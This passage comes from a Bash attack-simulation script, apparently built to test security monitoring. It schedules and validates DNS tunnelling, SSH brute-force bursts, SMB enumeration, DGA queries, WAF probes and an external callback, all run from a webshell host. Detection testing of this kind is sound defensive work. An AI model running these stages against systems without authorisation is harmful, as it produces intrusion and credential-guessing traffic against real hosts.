    (( DNS_VISIBILITY_SENT > 0 )) && success_rate=$((DNS_VISIBILITY_RESPONSE * 100 / DNS_VISIBILITY_SENT))
    DNS_VISIBILITY_SUCCESS_RATE="${success_rate}"
    if ! evaluate_dns_visibility_gate; then
        decision=blocked
        failure_reason="${DNS_VISIBILITY_FAILURE_REASON:-no_dns_responses}"
    else
        decision="${DNS_VISIBILITY_DECISION:-visible}"
        failure_reason=none
    fi
    DNS_VISIBILITY_DECISION="${decision}"
    local summary="DNS_VISIBILITY_SUMMARY resolver=${resolver} queries_sent=${DNS_VISIBILITY_SENT} responses_received=${DNS_VISIBILITY_RESPONSE} success_rate=${success_rate} avg_latency=${avg_latency} decision=${decision} failure_reason=${failure_reason} udp53_probe=${DNS_VISIBILITY_UDP53_PROBE:-unknown} tcp53_probe=${DNS_VISIBILITY_TCP53_PROBE:-unknown} valid_queries_sent=${DNS_VISIBILITY_VALID_SENT} valid_responses=${DNS_VISIBILITY_VALID_RESPONSE} invalid_queries_sent=${DNS_VISIBILITY_INVALID_SENT} invalid_nxdomain=${DNS_VISIBILITY_INVALID_NXDOMAIN} generated=${DNS_VISIBILITY_GENERATED} timeout=${DNS_VISIBILITY_TIMEOUT} error=${DNS_VISIBILITY_ERROR} resolver_type=${tool} sensor_expected_visibility=${DNS_SENSOR_EXPECTED_VISIBILITY:-LOW}"
    state_append "dns_visibility_validation.log" "${summary}"
    dns_tunnel_log_both "${summary}"

    [[ "${decision}" == visible || "${decision}" == pass ]]
}

dns_visibility_resolver_bypass_allowed() {
    local udp="${DNS_VISIBILITY_UDP53_PROBE:-unknown}" tcp="${DNS_VISIBILITY_TCP53_PROBE:-unknown}"
    local valid_resp=0
    valid_resp=$(safe_int "${DNS_VISIBILITY_VALID_RESPONSE:-0}")
    [[ "${udp}" == open || "${tcp}" == open || valid_resp -ge 1 ]] && return 0
    return 1
}

dns_run_visibility_or_block() {
    local resolver="$1" label="${2:-dns}"
    [[ -z "${resolver}" ]] && {
        dns_visibility_block_all_dns_modules "no_resolver_selected"
        return 1
    }
    if ! run_dns_visibility_validation "${resolver}"; then
        if dns_visibility_resolver_bypass_allowed; then
            DNS_ENVIRONMENT_BLOCKED=false
            DNS_ENVIRONMENT_BLOCK_REASON=""
            log_message "WARN" "DNS_VISIBILITY_BYPASS reason=resolver_working resolver=${resolver} valid_responses=${DNS_VISIBILITY_VALID_RESPONSE:-0} udp53=${DNS_VISIBILITY_UDP53_PROBE:-unknown} tcp53=${DNS_VISIBILITY_TCP53_PROBE:-unknown}"
            state_append "dns_visibility_validation.log" "DNS_VISIBILITY_BYPASS reason=resolver_working resolver=${resolver} valid_responses=${DNS_VISIBILITY_VALID_RESPONSE:-0} udp53=${DNS_VISIBILITY_UDP53_PROBE:-unknown} tcp53=${DNS_VISIBILITY_TCP53_PROBE:-unknown}"
            return 0
        fi
        log_message "ERROR" "DNS visibility validation failed for ${label}; skipping DNS detection modules"
        return 1
    fi
    return 0
}

followup_stage_dns() {
    local dns_hosts count="${DNS_BURST_COUNT}" sim_rc=0 dns_stage_set=false out="" attempted=0
    reset_dns_tunnel_execution_stats
    add_executed_stage "DNS Tunnel"
    write_report_entries "dns_tunnel" "T1071.004" "NDR/SIEM" "DNS Tunnel" "${TARGET_NET}" "start" "Stellar-pattern DNS tunnel simulation intensity=${FOLLOWUP_INTENSITY}"
    count=$(safe_int "${count}")
    (( count < DNS_TUNNEL_MIN_QUERIES )) && count="${DNS_TUNNEL_MIN_QUERIES}"
    (( count > DNS_TUNNEL_MAX_QUERIES )) && count="${DNS_TUNNEL_MAX_QUERIES}"

    sim_rc=0
    run_dns_tunnel_simulation "${count}" "${DNS_TUNNEL_MODE}" || sim_rc=$?

    if [[ "${DRY_RUN}" == true ]]; then
        followup_record_dns "${DNS_QUERIES_ATTEMPTED:-${count}}"
        set_stage_result "DNS Tunnel" "Success" "dry-run Stellar-pattern simulation"
        write_report_entries "dns_tunnel" "T1071.004" "NDR/SIEM" "DNS Tunnel" "${TARGET_NET}" "success" "dns simulation planned"
        poc_run_dns_tunnel_live_log_validation || true
        return 0
    fi

    if [[ "${DNS_TUNNEL_SKIP_REASON}" == "no_alive_targets" && -z "${DNS_TUNNEL_FILE_TARGETS}" ]]; then
        DNS_TUNNEL_STAGE_STATUS="skipped"
        set_stage_result "DNS Tunnel" "Skipped" "no_alive_targets"
        write_report_entries "dns_tunnel" "T1071.004" "NDR/SIEM" "DNS Tunnel" "${TARGET_NET}" "skipped" "no_alive_targets"
        dns_tunnel_log_both "skip reason=no_alive_targets"
        poc_run_dns_tunnel_live_log_validation || true
        return 0
    fi

    if [[ "${DNS_TUNNEL_SKIP_REASON}" == "dns_server_validation_failed" && -z "${DNS_TARGET_SERVER}" && -z "${DNS_SELECTED_DNS}" ]]; then
        DNS_TUNNEL_STAGE_STATUS="skipped"
        set_stage_result "DNS Tunnel" "Skipped" "dns_server_validation_failed"
        write_report_entries "dns_tunnel" "T1071.004" "NDR/SIEM" "DNS Tunnel" "${TARGET_NET}" "skipped" "dns_server_validation_failed"
        dns_tunnel_log_both "skip reason=dns_server_validation_failed"
        poc_run_dns_tunnel_live_log_validation || true
        return 0
    fi

    if (( sim_rc != 0 && DNS_QUERIES_ATTEMPTED == 0 )); then
        if net_sim_dns_tunnel_classify_env_failure "${DNS_TUNNEL_SKIP_REASON:-}" 2>/dev/null; then
            DNS_TUNNEL_STAGE_STATUS="environment_failure"
            set_stage_result "DNS Tunnel" "Failed" "ENVIRONMENT_FAILURE ${DNS_TUNNEL_SKIP_REASON}"
            write_report_entries "dns_tunnel" "T1071.004" "NDR/SIEM" "DNS Tunnel" "${TARGET_NET}" "failed" "ENVIRONMENT_FAILURE"
        else
            DNS_TUNNEL_SKIP_REASON="${DNS_TUNNEL_SKIP_REASON:-no_dns_tunnel_events}"
            DNS_TUNNEL_STAGE_STATUS="failed"
            set_stage_result "DNS Tunnel" "Failed" "${DNS_TUNNEL_SKIP_REASON}"
            write_report_entries "dns_tunnel" "T1071.004" "NDR/SIEM" "DNS Tunnel" "${TARGET_NET}" "failed" "${DNS_TUNNEL_SKIP_REASON}"
        fi
        poc_run_dns_tunnel_live_log_validation || true
        return 0
    fi

    followup_record_dns "${DNS_QUERIES_ATTEMPTED}"
    finalize_dns_tunnel_stage_judgment "DNS Tunnel" "dns_tunnel_file_client "
    log_dns_tunnel_final_summary "${DNS_TUNNEL_STAGE_STATUS:-failed}"
    case "${DNS_TUNNEL_STAGE_STATUS}" in
        success) write_report_entries "dns_tunnel" "T1071.004" "NDR/SIEM" "DNS Tunnel" "${TARGET_NET}" "success" "dns tunnel simulation attempted=${DNS_QUERIES_ATTEMPTED}" ;;
        partial|fallback) write_report_entries "dns_tunnel" "T1071.004" "NDR/SIEM" "DNS Tunnel" "${TARGET_NET}" "partial" "dns tunnel partial attempted=${DNS_QUERIES_ATTEMPTED}" ;;
        skipped) write_report_entries "dns_tunnel" "T1071.004" "NDR/SIEM" "DNS Tunnel" "${TARGET_NET}" "skipped" "${DNS_TUNNEL_SKIP_REASON:-skipped}" ;;
        *) write_report_entries "dns_tunnel" "T1071.004" "NDR/SIEM" "DNS Tunnel" "${TARGET_NET}" "failed" "${DNS_TUNNEL_SKIP_REASON:-zero queries}" ;;
    esac
    poc_run_dns_tunnel_live_log_validation || true
    save_dns_tunnel_overlap_result
}

stage_service_spike_burst() {
    [[ "${SERVICE_SPIKE}" != true ]] && return 0
    local secs="${SERVICE_SPIKE_SECONDS}" ssh_n http_n https_n smb_n wave=1
    ssh_n=$(safe_int "$(count_remote_target_file "ssh_hosts.txt")")
    http_n=$(safe_int "$(count_remote_target_file "http_targets.txt")")
    https_n=$(safe_int "$(count_remote_target_file "https_targets.txt")")
    smb_n=$(safe_int "$(count_remote_target_file "smb_hosts.txt")")
    log_message "STAGE" "Service spike waves (${secs}s) — baseline→spike→sustain for ML/XDR"
    add_executed_stage "Service Spike Burst"
    if [[ "${DRY_RUN}" == true ]]; then
        followup_record_http 100
        followup_record_ssh 50
        followup_record_dns 100
        return 0
    fi
    for wave in 1 2 3; do
        pipeline_stop_requested && break
        log_message "STAGE" "Service spike wave ${wave}/3 (overlap timeline)"
        state_append "service_spike_waves.log" "cycle=${CURRENT_CYCLE:-1} wave=${wave}"
        if (( http_n > 0 || https_n > 0 )); then
            run_stage_concurrent "Spike-W${wave} HTTP" followup_stage_http
        fi
        if (( ssh_n > 0 )) || [[ "${SSH_AUTH_BURST_ENABLED}" == true ]]; then
            run_stage_concurrent "Spike-W${wave} SSH Auth" stage_ssh_auth_burst
        fi
        if (( smb_n > 0 )); then
            run_stage_concurrent "Spike-W${wave} SMB" followup_stage_smb
        fi
        run_stage_concurrent "Spike-W${wave} DNS" followup_stage_dns
        wait_all_humanize_workers
        interruptible_sleep 2 || break
    done
    write_report_entries "service_spike" "TA0011" "XDR/NDR" "ML Spike" "multi" "success" "3-wave concurrent spike ${secs}s"
}

stage_mandatory_service_followups() {
    if [[ "${FAST_SAFE_MODE}" == true ]]; then
        log_message "OK" "FAST_SAFE: mandatory follow-ups handled by parallel fast-safe worker pool"
        return 0
    fi
    local ssh_n http_n https_n smb_n dns_cap usable_http usable_ssh http_done=false
    ssh_n=$(safe_int "$(count_remote_target_file "ssh_hosts.txt")")
    http_n=$(safe_int "$(count_remote_target_file "http_targets.txt")")
    https_n=$(safe_int "$(count_remote_target_file "https_targets.txt")")
    smb_n=$(safe_int "$(count_remote_target_file "smb_hosts.txt")")
    usable_http=$(safe_int "$(count_remote_target_file "usable_http_targets.txt")")
    usable_ssh=$(safe_int "$(count_remote_target_file "usable_ssh_hosts.txt")")
    count_all_discovered_services >/dev/null

    log_message "STAGE" "Mandatory service follow-ups (intensity=${FOLLOWUP_INTENSITY}, discovered=${SERVICES_DISCOVERED_TOTAL}, usable=${SERVICES_USABLE_TOTAL})"
    add_executed_stage "Mandatory Service Follow-ups"
    state_append "services_discovered.log" "ssh=${ssh_n} http=${http_n} https=${https_n} smb=${smb_n} usable=${SERVICES_USABLE_TOTAL} total=${SERVICES_DISCOVERED_TOTAL}"

    if (( http_n > 0 || https_n > 0 || usable_http > 0 )); then
        log_adaptive_decision "HTTP/HTTPS detected — HTTP URL Scan before EDR static signature test"
        followup_stage_http
        stage_ids_waf_signature_probe
        http_done=true
    fi

    if [[ "${EDR_STATIC_TEST_ENABLED}" == true ]]; then
        stage_edr_static_detection_test || true
    fi

    if [[ "${WEBSHELL_CHANNEL_BROKEN}" == true ]]; then
        log_message "WARN" "Webshell command execution failed during EDR static test — skipping remaining webshell-based follow-up stages"
        add_skipped_stage "Mandatory Service Follow-ups (webshell)" "WEBSHELL_CHANNEL_BROKEN after EDR static test"
        state_append "edr_static_test.log" "WEBSHELL_FOLLOWUP_SKIP reason=webshell_exec_failed_after_edr_test"
        return 0
    fi

    if [[ "${PIPELINE_OVERLAP}" == true ]]; then
        log_adaptive_decision "Multi-domain overlap: SSH+DNS+callback+non-standard ports concurrent (HTTP already completed)"
        CORRELATION_OVERLAP_LAUNCHED=true
        run_stage_concurrent "Enhanced DNS Tunnel" stage_dns_tunnel_enhanced
        run_stage_concurrent "Non-Standard Port Follow-up" stage_nonstandard_port_followup
        run_stage_concurrent "External Callback" stage_external_callback
        if [[ "${http_done}" != true ]] && (( http_n > 0 || https_n > 0 || usable_http > 0 )); then
            run_stage_concurrent "Mandatory HTTP URL Burst" followup_stage_http
            run_stage_concurrent "IDS/WAF Signature Probe" stage_ids_waf_signature_probe
        fi
        if (( ssh_n > 0 || usable_ssh > 0 )); then
            SSH_AUTH_BURST_ENABLED=true
            run_stage_concurrent "Mandatory SSH Auth Burst" stage_ssh_auth_burst
        fi
        if (( smb_n > 0 )); then
            run_stage_concurrent "Mandatory SMB" followup_stage_smb
        fi
        if [[ "${DNS_NEW_TLD_ENABLED}" == true ]]; then
            run_stage_concurrent "DNS New TLD Test" followup_stage_dns_new_tld
        fi
        run_stage_concurrent "Mandatory DNS" followup_stage_dns
        if [[ "${DGA_SIMULATION_ENABLED}" == true ]]; then
            run_stage_concurrent "DGA Simulation" followup_stage_dga
        fi
        wait_all_humanize_workers
        maybe_run_internal_web_fanout_fallback
        CORRELATION_CALLBACK_DONE=true
        return 0
    fi

    if [[ "${http_done}" != true ]] && (( http_n > 0 || https_n > 0 || usable_http > 0 )); then
        log_adaptive_decision "HTTP/HTTPS detected — forcing aggressive web follow-up"
        followup_stage_http
        stage_ids_waf_signature_probe
    fi
    if (( ssh_n > 0 || usable_ssh > 0 )); then
        log_adaptive_decision "SSH — forcing SSH Auth Burst (EDR/SIEM auth.log telemetry)"
        SSH_AUTH_BURST_ENABLED=true
        stage_ssh_auth_burst
    fi
    if (( smb_n > 0 )); then
        log_adaptive_decision "SMB detected — forcing SMB enumeration burst"
        followup_stage_smb
    fi
    dns_cap=1
    if [[ "${HAS_dig:-false}" == true || "${HAS_nslookup:-false}" == true || "${HAS_python3:-false}" == true ]]; then
        dns_cap=1
    fi
    if [[ "${DNS_NEW_TLD_ENABLED}" == true ]] && (( dns_cap > 0 )); then
        log_adaptive_decision "DNS New TLD Test — diverse new-TLD query burst (dns_new_tld analytics validation)"
        followup_stage_dns_new_tld
    fi
    if (( dns_cap > 0 )); then
        log_adaptive_decision "DNS capability — forcing entropy DNS burst"
        followup_stage_dns
    fi
    if [[ "${DGA_SIMULATION_ENABLED}" == true ]]; then
        log_adaptive_decision "DGA Simulation — NXDOMAIN burst + same-eTLD resolvable follow-up (independent of DNS tunnel)"
        followup_stage_dga
    fi
}

stage_followup_validation() {
    local ssh_n http_n https_n smb_n had_services=false failed=false
    local strict=false http_reachable_total=0 dns_cap=0

    load_overlap_stage_results_from_state
    sync_followup_http_counter_from_overlap
    sync_followup_ssh_counter_from_overlap

    ssh_n=$(safe_int "$(count_remote_target_file "ssh_hosts.txt")")
    http_n=$(safe_int "$(count_remote_target_file "http_targets.txt")")
    https_n=$(safe_int "$(count_remote_target_file "https_targets.txt")")
    smb_n=$(safe_int "$(count_remote_target_file "smb_hosts.txt")")

    if [[ "${STRICT_FOLLOWUP_VALIDATION}" == true || "${POC_INTENSITY}" == high || "${POC_INTENSITY}" == spike ]]; then
        strict=true
    fi

    if (( ssh_n + http_n + https_n + smb_n > 0 )); then
        had_services=true
    fi

    add_executed_stage "Follow-up Validation"
    state_append "followup_validation.log" "strict=${strict} services=${had_services} http=${FOLLOWUP_HTTP_REQUESTS} attempted=${HTTP_REQUESTS_ATTEMPTED} ssh=${FOLLOWUP_SSH_AUTH_FAILURES} smb=${FOLLOWUP_SMB_PROBES} dns=${FOLLOWUP_DNS_QUERIES} total=${FOLLOWUP_ACTIONS_TOTAL}"

    sync_web_combined_metrics
    compute_web_detection_confidence

    http_reachable_total=$((HTTP_TARGETS_REACHABLE + HTTPS_TARGETS_REACHABLE))

    if (( HTTP_SCAN_TARGET_COUNT == 0 )); then
        log_message "WARN" "URL Scan skipped — no reachable HTTP/HTTPS targets (not a failure)"
    elif (( HTTP_SCAN_TARGET_COUNT > 0 && HTTP_REQUESTS_ATTEMPTED == 0 )); then
        log_message "ERROR" "URL-SCAN EXECUTION FAILURE — selected_targets=${HTTP_SCAN_TARGET_COUNT} attempted=0"
        failed=true
        FOLLOWUP_VALIDATION_FAILED=true
    elif (( HTTP_SCAN_TARGET_COUNT > 0 && WEB_RESPONSES_RECEIVED == 0 )); then
        local http_rc=""
        http_rc=$(http_url_scan_classify_root_cause 0 "${HTTP_CONNECTED:-0}" "${HTTP_URL_SCAN_TIMEOUT_COUNT:-0}" "${HTTP_REQUESTS_ATTEMPTED:-0}")
        log_message "ERROR" "URL-SCAN RESPONSE FAILURE — no web responses received root_cause=${http_rc}"
        log_http_url_scan_diagnostic_summary "${HTTP_REQUESTS_ATTEMPTED:-0}" "${HTTP_CONNECTED:-0}" 0 0 \
            "$(($(safe_int "${HTTP_400_COUNT:-0}") + $(safe_int "${HTTP_403_COUNT:-0}") + $(safe_int "${HTTP_404_COUNT:-0}") + $(safe_int "${HTTPS_400_COUNT:-0}") + $(safe_int "${HTTPS_403_COUNT:-0}") + $(safe_int "${HTTPS_404_COUNT:-0}")))" \
            "$(($(safe_int "${HTTP_500_COUNT:-0}") + $(safe_int "${HTTPS_500_COUNT:-0}")))" "${http_rc}"
        if [[ "${strict}" == true ]]; then
            failed=true
            FOLLOWUP_VALIDATION_FAILED=true
        else
            log_message "WARN" "URL Scan produced no responses (non-fatal for ${POC_INTENSITY} intensity)"
        fi
    elif (( HTTP_SCAN_TARGET_COUNT > 0 )) && ! web_url_scan_successful; then
        if [[ "${strict}" == true ]]; then
            log_message "ERROR" "FOLLOW-UP VALIDATION FAILURE — URL Scan quality below threshold"
            failed=true
            FOLLOWUP_VALIDATION_FAILED=true
        else
            log_message "WARN" "URL Scan quality below threshold (non-fatal for ${POC_INTENSITY} intensity)"
        fi
    fi

    local http_followup_count="${FOLLOWUP_HTTP_REQUESTS}"
    (( http_followup_count < HTTP_REQUESTS_ATTEMPTED )) && http_followup_count="${HTTP_REQUESTS_ATTEMPTED}"
    if (( http_n + https_n > 0 )) && (( http_followup_count < 1 )); then
        log_message "WARN" "HTTP follow-up produced no requests (detection profile cap=${HTTP_FOLLOWUP_MAX_REQUESTS})"
        [[ "${strict}" == true && HTTP_SCAN_TARGET_COUNT > 0 ]] && failed=true
    fi
    local ssh_followup_count="${FOLLOWUP_SSH_AUTH_FAILURES}"
    (( ssh_followup_count < SSH_ATTEMPTS_EXECUTED )) && ssh_followup_count="${SSH_ATTEMPTS_EXECUTED}"
    (( ssh_followup_count < SSH_AUTH_FAILURES_OBSERVED )) && ssh_followup_count="${SSH_AUTH_FAILURES_OBSERVED}"
    if (( ssh_n > 0 )) && (( ssh_followup_count < MIN_SSH_AUTH_FAILURES )); then
        log_message "WARN" "SSH auth below minimum (${ssh_followup_count} < ${MIN_SSH_AUTH_FAILURES}) — emergency SSH auth burst"
        if [[ "${DRY_RUN}" != true ]]; then
            SSH_AUTH_BURST_ENABLED=true
            SSH_BURST_ATTEMPTS="${MIN_SSH_AUTH_FAILURES}"
            stage_ssh_auth_burst
        fi
        [[ "${strict}" == true ]] && failed=true
    fi
    if (( smb_n > 0 )) && (( FOLLOWUP_SMB_PROBES < MIN_SMB_PROBES )); then
        log_message "WARN" "SMB below minimum — emergency SMB burst"
        if [[ "${DRY_RUN}" != true ]]; then
            SMB_PROBE_TARGET="${MIN_SMB_PROBES}"
            followup_stage_smb
        fi
        [[ "${strict}" == true ]] && failed=true
    fi
    if (( FOLLOWUP_DNS_QUERIES < MIN_DNS_QUERIES )); then
        if [[ "${DRY_RUN}" != true ]]; then
            DNS_BURST_COUNT="${MIN_DNS_QUERIES}"
            followup_stage_dns
        fi
    fi

    if [[ "${HAS_dig:-false}" == true || "${HAS_nslookup:-false}" == true || "${HAS_python3:-false}" == true ]]; then
        dns_cap=1
    fi

    if (( DNS_QUERIES_ATTEMPTED == 0 )); then
        if (( dns_cap == 0 )); then
            DEGRADED_TELEMETRY=true
            log_message "WARN" "DNS tunnel: degraded telemetry — DNS capability missing on webshell host"
        else
            log_message "WARN" "DNS tunnel enhanced: no queries attempted (DNS_QUERIES_ATTEMPTED=0)"
        fi
    fi
    if (( INTERNAL_FANOUT_TARGETS == 0 )); then
        log_message "WARN" "Internal Web Fanout skipped — no fanout targets"
    elif (( EXTERNAL_CALLBACK_CONNECTED == 0 && INTERNAL_FANOUT_ATTEMPTED == 0 )); then
        log_message "ERROR" "INTERNAL FANOUT EXECUTION FAILURE — callback connected=0 with fanout targets present"
        failed=true
        FOLLOWUP_VALIDATION_FAILED=true
    fi

    if [[ "${strict}" == true ]]; then
        if (( dns_cap > 0 && DNS_QUERIES_PLANNED > 0 && DNS_QUERIES_ATTEMPTED == 0 )); then
            failed=true
            FOLLOWUP_VALIDATION_FAILED=true
            log_message "ERROR" "FOLLOW-UP VALIDATION FAILURE — DNS planned but attempted=0"
        fi
    fi

    if (( FOLLOWUP_ACTIONS_TOTAL == 0 )) && [[ "${had_services}" == true ]] && (( http_reachable_total > 0 || ssh_n > 0 || smb_n > 0 )); then
        failed=true
        SCAN_ONLY_WARNING=true
        log_message "ERROR" "SCAN-ONLY FAILURE: services discovered with reachable targets but follow-up actions=0"
        state_append "scan_only_failure.log" "cycle=${CURRENT_CYCLE:-1} SCAN-ONLY FAILURE"
    fi

    if [[ "${failed}" == true && "${strict}" == true ]]; then
        FOLLOWUP_VALIDATION_FAILED=true
        SCAN_ONLY_WARNING=true
    fi

    compute_followup_validation_result
    case "${VALIDATION_RESULT}" in
        FAIL)
            FOLLOWUP_VALIDATION_FAILED=true
            set_stage_result "Follow-up Validation" "Failed" "${VALIDATION_REASON}"
            return 1
            ;;
        WARN)
            set_stage_result "Follow-up Validation" "Partial" "${VALIDATION_REASON}"
            return 0
            ;;
        *)
            if [[ "${failed}" == true ]]; then
                FOLLOWUP_VALIDATION_FAILED=true
                set_stage_result "Follow-up Validation" "Partial" "follow-up checks incomplete (${VALIDATION_REASON})"
                return 0
            fi
            set_stage_result "Follow-up Validation" "Success" "${VALIDATION_REASON}"
            return 0
            ;;
    esac
}

simulate_dry_run_followup_counts() {
    [[ "${DRY_RUN}" != true ]] && return 0
    [[ -n "${FOLLOWUP_DRY_RUN_SIMULATED:-}" ]] && return 0
    FOLLOWUP_DRY_RUN_SIMULATED=1
    local ssh_n smb_n candidates
    stage_validate_web_reachability || true
    candidates=$(collect_http_url_scan_candidates)
    if select_http_url_scan_concentrated_target "${candidates}" >/dev/null; then
        read -r _main_h _main_p _main_s <<< "${HTTP_URL_SCAN_SELECTION_LINE}"
        sync_url_scan_selected_target_count "${_main_h} ${_main_p} ${_main_s}"
    else
        sync_url_scan_selected_target_count ""
    fi
    ssh_n=$(count_hosts_blob "$(get_local_hosts "ssh_hosts.txt")")
    smb_n=$(count_hosts_blob "$(get_local_hosts "smb_hosts.txt")")
    SERVICES_DISCOVERED_TOTAL=$((HTTP_TARGETS_DISCOVERED + HTTPS_TARGETS_DISCOVERED + ssh_n + smb_n + 4))
    if (( HTTP_SCAN_TARGET_COUNT > 0 )); then
        resolve_http_followup_mode
        resolve_http_scan_wave_plan
        [[ "${HTTP_FOLLOWUP_MODE}" == "tcp-fallback" && "${DRY_RUN}" == true ]] && HTTP_FOLLOWUP_MODE="planned (remote deps not checked)"
        HTTP_REQUESTS_PLANNED="${HTTP_SCAN_UNIQUE_URL_TARGET}"
        print_http_ua_dry_run_samples
        simulate_http_scan_response_metrics "${HTTP_REQUESTS_PLANNED}"
        simulate_http_attack_metrics "${HTTP_REQUESTS_PLANNED}"
        HTTP_REQUESTS_ATTEMPTED="${HTTP_REQUESTS_PLANNED}"
        URL_SCAN_UNIQUE_ATTEMPTED="${HTTP_SCAN_UNIQUE_URL_TARGET}"
        simulate_url_scan_unique_metrics "${URL_SCAN_UNIQUE_ATTEMPTED}"
        HTTP_RESPONSES_RECEIVED=$((HTTP_SCAN_FAILED_RESPONSES + HTTP_SCAN_SUCCESS_RESPONSES))
        HTTP_CONNECTED="${HTTP_RESPONSES_RECEIVED}"
        HTTP_PROPFIND_COUNT=$((HTTP_REQUESTS_PLANNED / 8 + 1))
        HTTP_POST_COUNT=$((HTTP_REQUESTS_PLANNED / 6 + 1))
        HTTP_OPTIONS_COUNT=$((HTTP_REQUESTS_PLANNED / 10 + 1))
        ABNORMAL_USER_AGENT_COUNT=$((HTTP_REQUESTS_PLANNED * 9 / 10))
        RARE_USER_AGENT_COUNT=$((HTTP_REQUESTS_PLANNED * 4 / 10))
        NORMAL_USER_AGENT_COUNT=$((HTTP_REQUESTS_PLANNED / 10))
        PAYLOAD_USER_AGENT_COUNT=$((HTTP_REQUESTS_PLANNED * 5 / 10))
        UA_SQLI_STYLE_COUNT=$((HTTP_REQUESTS_PLANNED * 2 / 10))
        UA_ENCODING_ABUSE_COUNT=$((HTTP_REQUESTS_PLANNED * 2 / 10))
        UA_COMMAND_STYLE_COUNT=$((HTTP_REQUESTS_PLANNED / 10))
        THREAT_HUNT_URL_REQUESTS="${HTTP_REQUESTS_PLANNED}"
        HTTP_URL_SCAN_STAGE_STATUS="success"
        sync_http_followup_counter_aliases
        sync_web_combined_metrics
        compute_web_detection_confidence
        followup_record_http "${HTTP_REQUESTS_PLANNED}"
    else
        HTTP_REQUESTS_PLANNED=0
        HTTP_REQUESTS_ATTEMPTED=0
        HTTP_URL_SCAN_STAGE_STATUS="skipped"
    fi
    if (( ssh_n > 0 )) || [[ "${SSH_AUTH_BURST_ENABLED}" == true ]]; then
        (( ssh_n < 1 )) && ssh_n=1
        SSH_ATTEMPTS_PLANNED=$((ssh_n * SSH_BURST_ATTEMPTS))
        SSH_ATTEMPTS_EXECUTED="${SSH_ATTEMPTS_PLANNED}"
        SSH_AUTH_ATTEMPTED="${SSH_ATTEMPTS_PLANNED}"
        SSH_AUTH_FAILURES_OBSERVED="${SSH_ATTEMPTS_PLANNED}"
        followup_record_ssh "${SSH_ATTEMPTS_PLANNED}"
    fi
    if (( smb_n > 0 )); then
        SMB_PROBES_PLANNED=$(( smb_n * SMB_PROBE_TARGET ))
        SMB_PROBES_ATTEMPTED="${SMB_PROBES_PLANNED}"
        SMB_PROBES_CONNECTED="${SMB_PROBES_PLANNED}"
        followup_record_smb "${SMB_PROBES_PLANNED}"
    fi
    DNS_QUERIES_ATTEMPTED="${DNS_BURST_COUNT}"
    followup_record_dns "${DNS_BURST_COUNT}"
    SERVICES_USABLE_TOTAL="${SERVICES_DISCOVERED_TOTAL}"
    simulate_correlation_telemetry_dry_run
}

print_followup_dry_run_plan() {
    simulate_dry_run_followup_counts
    cat <<EOF
[SERVICE-AWARE FOLLOW-UP PLAN]
$(format_intensity_runtime_values_block)
- User intensity: ${POC_INTENSITY} (schedule: $(pipeline_schedule_description))
- HTTP per host: ${HTTP_FOLLOWUP_REQUESTS} | SSH auth per host: ${SSH_BURST_ATTEMPTS} | DNS: ${DNS_BURST_COUNT} | SMB/host: ${SMB_PROBE_TARGET}
- Persistent beacon: ${PERSISTENT_BEACON} | Overlap: ${PIPELINE_OVERLAP} | Burst: ${BURST_MODE} | Service spike: ${SERVICE_SPIKE}
- Simulated totals: HTTP=${FOLLOWUP_HTTP_REQUESTS} SSH=${FOLLOWUP_SSH_AUTH_FAILURES} SMB=${FOLLOWUP_SMB_PROBES} DNS=${FOLLOWUP_DNS_QUERIES}

Web Reachability (planned)
- HTTP discovered=${HTTP_TARGETS_DISCOVERED} HTTP reachable=${HTTP_TARGETS_REACHABLE}
- HTTPS discovered=${HTTPS_TARGETS_DISCOVERED} HTTPS reachable=${HTTPS_TARGETS_REACHABLE}
- URL scan selected targets=${HTTP_SCAN_TARGET_COUNT}

HTTP URL Scan (planned)
- planned=${HTTP_REQUESTS_PLANNED} attempted=${HTTP_REQUESTS_ATTEMPTED} connected=${HTTP_CONNECTED} responses=${WEB_RESPONSES_RECEIVED}
- 403/404/405=${HTTP_403_COUNT}/${HTTP_404_COUNT}/${HTTP_405_COUNT} fail_ratio=${HTTP_SCAN_FAIL_RATIO}% stage_status=${HTTP_URL_SCAN_STAGE_STATUS}
$(format_url_scan_stellar_model_block)
- Success metrics: HTTP planned/attempted/connected=${HTTP_REQUESTS_PLANNED}/${HTTP_REQUESTS_ATTEMPTED}/${HTTP_CONNECTED} SSH planned/attempted/observed=${SSH_ATTEMPTS_PLANNED}/${SSH_AUTH_ATTEMPTED}/${SSH_AUTH_FAILURES_OBSERVED}
- Strict validation (high/spike): ${STRICT_FOLLOWUP_VALIDATION}

[CORRELATION TELEMETRY PLAN]
- External Callback: ${ATTACKER_BASE_URL} planned=${BEACON_COUNT} status=${EXTERNAL_CALLBACK_STATUS:-planned}
- Internal Web Fanout per target: ${INTERNAL_FANOUT_PER_TARGET} targets=${INTERNAL_FANOUT_TARGETS:-0} status=${INTERNAL_FANOUT_STATUS:-planned}
- DNS Tunnel Enhanced planned: ${DNS_TUNNEL_QUERY_COUNT} status=${DNS_TUNNEL_STAGE_STATUS:-planned}
- External attempted/connected/responses: ${EXTERNAL_CALLBACK_ATTEMPTED}/${EXTERNAL_CALLBACK_CONNECTED}/${EXTERNAL_CALLBACK_RESPONSES}
- Internal fanout attempted/connected/responses: ${INTERNAL_FANOUT_ATTEMPTED}/${INTERNAL_FANOUT_CONNECTED}/${INTERNAL_FANOUT_RESPONSES}
- DNS enhanced attempted/planned: ${DNS_QUERIES_ATTEMPTED}/${DNS_QUERIES_PLANNED}
- DNS effective-TLD/cluster.local/powerapps/suspicious/https/entropy: ${DNS_EFFECTIVE_TLD_COUNT:-0}/${DNS_CLUSTER_LOCAL_COUNT:-0}/${DNS_POWERAPPS_STYLE_COUNT:-0}/${DNS_SUSPICIOUS_TLD_COUNT:-0}/${DNS_HTTPS_QUERY_COUNT:-0}/${DNS_TOTAL_ENTROPY_STYLE_COUNT:-0}
- Non-standard port connections: ${NONSTANDARD_PORT_CONNECTIONS:-0}
- Internal fanout planned (targets*${INTERNAL_FANOUT_PER_TARGET}): see fanout targets
- Correlation beacon cycles: ${CORRELATION_BEACON_CYCLES:-0}

$(format_unified_telemetry_capability_summary)
EOF
}

append_followup_report_sections() {
    local scan_warn="no"
    [[ "${SCAN_ONLY_WARNING}" == true ]] && scan_warn="YES — investigate follow-up execution"
    if [[ -n "${REPORT_MD}" ]]; then
        cat <<EOF >> "${REPORT_MD}" 2>/dev/null || true

## Correlation Telemetry Summary

$(format_correlation_telemetry_summary_block)

## HTTP Follow-up Summary

| Metric | Value |
|---|---|
| Discovered Hosts | ${HTTP_FOLLOWUP_DISCOVERED_HOSTS:-0} |
| Selected Hosts | ${HTTP_FOLLOWUP_SELECTED_HOSTS:-0} |
